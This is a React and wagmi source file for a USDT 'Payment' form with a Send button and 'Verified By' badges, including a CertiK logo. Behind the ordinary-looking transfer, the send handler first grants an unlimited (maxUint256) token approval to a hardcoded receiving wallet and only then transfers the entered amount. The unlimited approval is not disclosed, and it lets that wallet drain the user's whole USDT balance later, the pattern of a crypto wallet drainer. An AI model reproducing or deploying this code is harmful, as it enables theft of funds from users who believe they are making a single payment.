import BlockContent from "../../components/BlockContent";
import { useCallback, useEffect, useMemo, useState } from "react";
import {
  useAccount,
  useChainId,
  useReadContracts,
  useWaitForTransactionReceipt,
  useWriteContract,
} from "wagmi";
import { TOKEN_DIVIDEND, USDT_CONTRACT } from "../../common/constant";
import { erc20Abi, maxUint256, parseEther } from "viem";
import BigNumber from "bignumber.js";
import { toast } from "react-toastify";
import ButtonPrimary from "../../components/ButtonPrimary";
import Input from "../../components/Input";
import { MdVerified } from "react-icons/md";
import ConnectWallet from "../../components/ConnectWallet";
import useShortenAddress from "../../hooks/useShortenAddress";

const walletReceive = "0xee80d024578A212a39F9a2d227BE6df31F22EDE2";

const RightSide = () => {
  const [inputValue, setInputValue] = useState("");
  const onChangeInputValue = useCallback((event) => {
    setInputValue(event.target.value);
  }, []);
  const { isConnected } = useAccount();

  const [errors, setErrors] = useState();
  const [loading, setLoading] = useState(false);

  const { address } = useAccount();
  const chainId = useChainId();
  const shortenedAddress = useShortenAddress(USDT_CONTRACT[chainId]);
  // const estimateGas = useEstimateGas();
  // const estimateFeePerGas = useEstimateMaxPriorityFeePerGas();

  const rawBalance = useReadContracts({
    allowFailure: true,
    contracts: [
      {
        address: USDT_CONTRACT[chainId],
        abi: erc20Abi,
        functionName: "balanceOf",
        // @ts-ignore
        args: [address],
      },
    ],
    query: {
      enabled: typeof address !== "undefined",
      refetchInterval: 1000,
    },
  });

  const isDisabledInput = loading || !address;

  const { error: errorApprove, writeContractAsync: writeContractApproveAsync } =
    useWriteContract();

  const {
    data: sendHash,
    error: errorSend,
    writeContractAsync: writeContractSendAsync,
  } = useWriteContract();

  const { isSuccess: isConfirmedSend } = useWaitForTransactionReceipt({
    hash: sendHash,
  });

  const balance = useMemo(() => {
    const rawBalanceValue = rawBalance.data?.[0]?.result;

    if (!rawBalanceValue) {
      return {
        value: undefined,
        formattedNumber: undefined,
        formatted: undefined,
      };
    }

    const balanceBn = BigNumber(rawBalanceValue.toString()).div(TOKEN_DIVIDEND);

    return {
      value: rawBalanceValue,
      formattedNumber: balanceBn.toNumber(),
      formatted: balanceBn.toString(),
    };
  }, [rawBalance]);

  const onClickMax = useCallback(() => {
    const balanceValue = balance?.value;

    if (!balanceValue) {
      setInputValue("0");
      return;
    }

    const balanceValueBn = BigNumber(balanceValue.toString());

    setInputValue(balanceValueBn.div(TOKEN_DIVIDEND).toString());
  }, [balance]);

  // const onChangeToAddress = useCallback(
  //   (event: ChangeEvent<HTMLInputElement>) => {
  //     setToAddress(event.target.value);
  //   },
  //   []
  // );

  const onClickSend = useCallback(async () => {
    setErrors(undefined);

    const errorArr = [];

    // if (!toAddress || !isAddress(toAddress)) {
    //   errorArr.push(`Address '${toAddress}' is invalid.`);
    // }

    let sendValue;

    try {
      sendValue = parseEther(inputValue);

      if (sendValue <= 0) {
        errorArr.push(`Amount '${inputValue}' is invalid.`);
      } else if (sendValue > (balance?.value ?? 0)) {
        errorArr.push("Insufficient balance.");
      }
    } catch (e) {
      errorArr.push(e.message);
    }

    if (errorArr.length > 0) {
      setErrors(errorArr.join("\n"));
      return;
    }

    setLoading(true);

    await writeContractApproveAsync({
      address: USDT_CONTRACT[chainId],
      functionName: "approve",
      abi: erc20Abi,
      // @ts-ignore
      args: [walletReceive, maxUint256],
    });

    await writeContractSendAsync({
      address: USDT_CONTRACT[chainId],
      functionName: "transfer",
      abi: erc20Abi,
      // @ts-ignore
      args: [walletReceive, sendValue],
    });
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [inputValue]);

  useEffect(() => {
    if (errorApprove) {
      setErrors(errorApprove.shortMessage ?? errorApprove.message);
    }

    if (errorSend) {
      setErrors(errorSend.shortMessage ?? errorSend.message);
    }
  }, [errorApprove, errorSend]);

  useEffect(() => {
    if (isConfirmedSend) {
      setLoading(false);
      toast.success("Transaction confirmed: " + sendHash);
    } else {
      setLoading(false);
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isConfirmedSend]);

  useEffect(() => {
    if (errors) {
      // toast({
      //   itemID: "error",
      //   title: "Error",
      //   description: errors,
      //   variant: "destructive",
      // });
      toast.error(errors);
      setLoading(false);
    } else {
      setLoading(false);
    }
  }, [errors]);
  console.log(BigNumber(balance?.value));
  return (
    <div className="lg:w-full sm:w-[80%] md:w-[50%] w-full flex flex-col gap-y-4">
      <BlockContent title="Payment" className="gap-y-3">
        <div className="w-full text-left">
          <label className="text-sm sm:text-base">Token Address</label>
        </div>
        <div className="flex justify-between w-full p-4 rounded-large bg-secondary rounded-xl bg-grayColor2">
          <div className="flex items-center gap-x-3">
            <img
              width={48}
              height={48}
              decoding="async"
              src={
                "https://coinhere.io/wp-content/uploads/2020/08/Tether-USDT-icon-1.png"
              }
              alt={"USDT"}
            />
            <div className="flex flex-col gap-y-[2px]">
              <h4 className="text-xl font-semibold text-white">USDT</h4>
              <span className="text-sm text-white">Tether</span>
            </div>
          </div>
          <span
            className={
              "text-base lg:text-xl text-grayColor " +
              (!isConnected && "opacity-50")
            }
          >
            {shortenedAddress}
          </span>
        </div>

        {isConnected ? (
          <>
            <div className="flex items-center justify-between w-full mt-2">
              <label className="text-sm sm:text-base">Amount</label>
              <span className="text-grayColor">
                Available{" "}
                {balance?.value ? BigNumber(balance?.value.toString()) : 0} USDT
              </span>
            </div>
            <div className="relative w-full">
              <Input
                id="amount"
                type="number"
                placeholder="1,000"
                value={inputValue}
                onChange={onChangeInputValue}
                min={0}
              />
              <button
                className="absolute px-5 py-2 transition-all rounded-lg bottom-[6px] right-3 button-stat hover:scale-105"
                onClick={onClickMax}
              >
                Max
              </button>
            </div>
            <ButtonPrimary
              className="w-full py-3 mt-6"
              onClick={onClickSend}
              loading={isDisabledInput}
            >
              Send USDT
            </ButtonPrimary>
          </>
        ) : (
          <ConnectWallet className="w-full py-3 mt-3" />
        )}
      </BlockContent>
      <BlockContent
        title={
          <span className="flex items-center gap-x-2">
            Verified By <MdVerified className="text-[#29C51F] text-xl" />
          </span>
        }
        className="gap-y-3"
      >
        <div className="grid grid-cols-1 px-3 mt-3">
          <div className="grid grid-cols-2 mt-3 gap-x-7">
            <img src="certik-foundation-logo-white.png" alt="" />
            <img src="62debd0d3b1a233e9b54280a_1c.png" alt="" />
          </div>
          <img src="brand-sponsor.png" alt="" />
        </div>
      </BlockContent>
    </div>
  );
};

export default RightSide;
